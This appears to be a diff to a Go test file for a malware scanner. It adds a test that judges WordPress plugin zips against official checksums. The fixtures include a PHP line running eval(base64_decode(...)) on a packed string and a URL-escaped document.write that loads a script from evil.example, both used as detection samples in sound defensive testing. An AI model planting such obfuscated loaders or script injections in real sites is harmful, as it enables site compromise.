@@ -1,8 +1,13 @@
 package scanner
 
 import (
+	"archive/zip"
 	"bytes"
+	"crypto/md5"
 	"encoding/base64"
+	"os"
+	"path/filepath"
+	"strings"
 	"testing"
 )
 
@@ -73,5 +78,59 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 	hidden := `document.write(unescape('%3C%73%63%72%69%70%74%20%73%72%63%3D%22%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%2F%22%3E%3C%2F%73%63%72%69%70%74%3E'));`
 	if v := AnalyzeScript("js", []byte(hidden)); v == nil {
 		t.Error("escaped script not reported")
+	}
+}
+
+// A published plugin's zip (WP-CLI's download cache on s5: the same
+// WooCommerce PayPal Payments 4.1.3 zip quarantined 911 times in ten
+// accounts) is judged like the installed plugin: members matching the
+// version's official checksums are not reported. A changed member, a zip
+// that is not one plugin, or a plugin without checksums is still checked.
+func TestFleetPluginZipOfficialMembers(t *testing.T) {
+	packed := []byte("<?php $d='" + strings.Repeat("QUFB", 600) + "';eval(base64_decode($d));")
+	if d := analyze(".php", packed); d == nil || d.Category != CatVirus {
+		t.Fatalf("fixture: %+v", d)
+	}
+	main := []byte("<?php\n/**\n * Plugin Name: Pay Example\n * Version: 4.1.3\n */\n")
+	mk := func(name string, files map[string][]byte) string {
+		p := filepath.Join(t.TempDir(), name)
+		f, _ := os.Create(p)
+		w := zip.NewWriter(f)
+		for n, c := range files {
+			e, _ := w.Create(n)
+			e.Write(c)
+		}
+		w.Close()
+		f.Close()
+		return p
+	}
+	official := md5.Sum(packed)
+	var asked []string
+	known := func(slug, version, rel string, sum [16]byte) bool {
+		asked = append(asked, slug+"@"+version+":"+rel)
+		return slug == "pay-example" && version == "4.1.3" && rel == "build/loader.php" && sum == official
+	}
+	plugin := map[string][]byte{"pay-example/pay-example.php": main, "pay-example/build/loader.php": packed}
+	z := mk("pay-example-4.1.3.zip", plugin)
+	fi, _ := os.Stat(z)
+	if d := scanZipKnown(z, fi.Size(), known); d != nil {
+		t.Fatalf("official plugin zip reported: %s (asked %v)", d.Signature, asked)
+	}
+	// Without the checksums the same zip is reported.
+	if d := scanZipKnown(z, fi.Size(), nil); d == nil {
+		t.Fatal("zip not checked without checksums")
+	}
+	// A changed member.
+	changed := append(append([]byte{}, packed...), ' ')
+	z2 := mk("pay-example-4.1.3.zip", map[string][]byte{"pay-example/pay-example.php": main, "pay-example/build/loader.php": changed})
+	fi, _ = os.Stat(z2)
+	if d := scanZipKnown(z2, fi.Size(), known); d == nil {
+		t.Fatal("changed member not reported")
+	}
+	// Not one plugin folder: a shell next to a copy of the official file.
+	z3 := mk("pay-example-4.1.3.zip", map[string][]byte{"pay-example/pay-example.php": main, "pay-example/build/loader.php": packed, "x.php": changed})
+	fi, _ = os.Stat(z3)
+	if d := scanZipKnown(z3, fi.Size(), func(string, string, string, [16]byte) bool { return true }); d == nil {
+		t.Fatal("mixed zip trusted")
 	}
 }
